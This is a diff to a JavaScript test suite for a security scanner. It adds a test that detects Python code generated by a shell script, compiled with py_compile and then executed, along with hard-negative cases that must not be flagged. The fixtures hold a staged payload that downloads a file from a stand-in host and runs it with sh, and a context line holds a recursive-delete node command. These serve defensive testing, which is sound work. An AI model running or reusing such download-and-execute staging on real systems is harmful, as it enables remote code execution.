@@ -881,6 +881,63 @@ describe("embedded interpreter payloads", () => {
     }
   });
 
+  it("propagates generated Python only through a proven py_compile output", () => {
+    const generated = `
+      runtime=$(command -v python3)
+      echo 'import requests, os' > /tmp/stage.py
+      echo 'r=requests.get("https://example.test/a")' >> /tmp/stage.py
+      echo 'open("/tmp/a", "wb").write(r.content)' >> /tmp/stage.py
+      echo 'os.system("sh /tmp/a")' >> /tmp/stage.py
+    `;
+    const result = scan(`${generated}
+      $runtime -c 'import py_compile as pc; pc.compile("/tmp/stage.py", "/tmp/stage.pyc")'
+      $runtime /tmp/stage.pyc
+    `);
+    expect(result.findings).toEqual(expect.arrayContaining([
+      expect.objectContaining({
+        ruleId: "python.network",
+        category: "network_egress",
+        origin: expect.objectContaining({ kind: "compiled-file" }),
+      }),
+      expect.objectContaining({
+        ruleId: "python.chain.download-write-execute",
+        category: "download_execution",
+        origin: expect.objectContaining({ kind: "compiled-file" }),
+      }),
+    ]));
+
+    const hardNegatives = [
+      `${generated}
+       $runtime -c 'import py_compile; py_compile.compile("/tmp/other.py", "/tmp/stage.pyc")'
+       $runtime /tmp/stage.pyc`,
+      `${generated}
+       $runtime -c 'import py_compile; py_compile.compile("/tmp/stage.py", output)'
+       $runtime /tmp/stage.pyc`,
+      `${generated}
+       $runtime -c 'import py_compile; py_compile.compile("/tmp/stage.py", "/tmp/a.pyc"); py_compile.compile("/tmp/stage.py", "/tmp/b.pyc")'
+       $runtime /tmp/a.pyc`,
+      `${generated}
+       $runtime -c 'import py_compile; py_compile.compile("/tmp/stage.py", "/tmp/stage.pyc")'`,
+      `${generated}
+       $runtime -c 'import py_compile; py_compile.compile("/tmp/stage.py", "/tmp/stage.pyc")'
+       $runtime /tmp/other.pyc`,
+      `${generated}
+       compile_stage() {
+         $runtime -c 'import py_compile; py_compile.compile("/tmp/stage.py", "/tmp/stage.pyc")'
+       }
+       $runtime /tmp/stage.pyc`,
+      `${generated}
+       $runtime -c 'import py_compile; py_compile.compile("/tmp/stage.py", "/tmp/stage.pyc")'
+       echo x > /tmp/stage.pyc
+       $runtime /tmp/stage.pyc`,
+    ];
+    for (const negative of hardNegatives) {
+      expect(scan(negative).findings.some((finding) =>
+        finding.origin?.kind === "compiled-file"
+      ), negative).toBe(false);
+    }
+  });
+
   it("recursively scans node -e and heredocs", () => {
     const argument = scan(`node -e "require('fs').rmSync('/tmp/x', {recursive:true})"`);
     expect(argument.findings.some((item) => item.ruleId === "javascript.destructive")).toBe(true);
